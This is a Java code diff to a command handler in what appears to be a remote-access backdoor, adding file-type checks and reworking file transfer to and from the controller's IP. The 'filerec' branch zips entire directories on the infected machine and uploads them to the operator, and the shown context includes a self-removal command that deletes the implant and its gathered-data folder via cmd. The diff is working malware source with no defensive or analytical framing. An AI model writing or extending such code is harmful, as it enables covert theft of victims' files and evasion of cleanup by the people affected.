@@ -85,20 +85,56 @@ public class HandleCommand {
 				if (e.getMessage() != null)
 					send += ":\n" + e.getMessage();
 			}
-		else if (command.startsWith("filesend") || command.startsWith("filerec"))
+		else if (command.startsWith("filetype")) {
+			File file = new File(command.substring(9));
+			if (file.isFile())
+				send = "file";
+			else if (file.isDirectory())
+				send = "directory";
+			else
+				send = "not real";
+		} else if (command.startsWith("filesend")) {
 			try {
-				if (command.startsWith("filesend")) {
-					FTP.backdoor(command.substring(9), "rec", Backdoor.ip);
-					send = "File sent";
-				} else if (command.startsWith("filerec")) {
-					FTP.backdoor(command.substring(8), "send", Backdoor.ip);
-					send = "File received";
-				}
-				while (!FTP.socketTransferDone)
+				FTP.backdoor(command.substring(9), "rec", Backdoor.ip);
+				while (!FTP.socketTransferDone && FTP.error == null)
 					Thread.sleep(10);
-				FTP.socketTransferDone = false;
+				if (FTP.socketTransferDone)
+					FTP.socketTransferDone = false;
+				if (FTP.error != null) {
+					String error = FTP.error;
+					FTP.error = null;
+					throw new Exception(error);
+				}
+				send = "File sent";
 			} catch (Exception e) {
-				send = "An error occurred when trying to transfer file";
+				send = "An error occurred when trying to send file";
+				if (e.getMessage() != null)
+					send += ":\n" + e.getMessage();
+			}
+		} else if (command.startsWith("filerec"))
+			try {
+				File file = new File(command.substring(8));
+				if (file.isFile())
+					FTP.backdoor(file.getAbsolutePath(), "send", Backdoor.ip);
+				else if (file.isDirectory()) {
+					Utils.zipDir(file.getAbsolutePath());
+					FTP.backdoor(file.getAbsolutePath() + ".zip", "send", Backdoor.ip);
+				}
+
+				while (!FTP.socketTransferDone && FTP.error == null)
+					Thread.sleep(10);
+				if (FTP.socketTransferDone)
+					FTP.socketTransferDone = false;
+				if (FTP.error != null) {
+					String error = FTP.error;
+					FTP.error = null;
+					throw new Exception(error);
+				}
+				if (file.isDirectory())
+					FileUtils.forceDelete(new File(file.getAbsolutePath() + ".zip"));
+				send = "File received";
+			} catch (Exception e) {
+				send = "An error occurred when trying to receive file";
 				if (e.getMessage() != null)
 					send += ":\n" + e.getMessage();
 			}
@@ -151,7 +187,7 @@ public class HandleCommand {
 				if (e.getMessage() != null)
 					send += ":\n" + e.getMessage();
 			}
-		else if (command.startsWith("zip")) {
+		else if (command.startsWith("zip"))
 			try {
 				File dir = new File(command.substring(4));
 				if (!dir.isDirectory())
@@ -163,7 +199,7 @@ public class HandleCommand {
 				if (e.getMessage() != null)
 					send += ":\n" + e.getMessage();
 			}
-		} else if (command.startsWith("unzip")) {
+		else if (command.startsWith("unzip"))
 			try {
 				String output = Utils.unzip(command.substring(6));
 				send = "Contents of ZIP file decompressed to '" + output + "'";
@@ -172,7 +208,7 @@ public class HandleCommand {
 				if (e.getMessage() != null)
 					send += ":\n" + e.getMessage();
 			}
-		} else if (command.equals("remove"))
+		else if (command.equals("remove"))
 			try {
 				Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && del /f /q run.jar run.bat && rd /s /q "
 						+ Backdoor.gatheredDir + " jre");
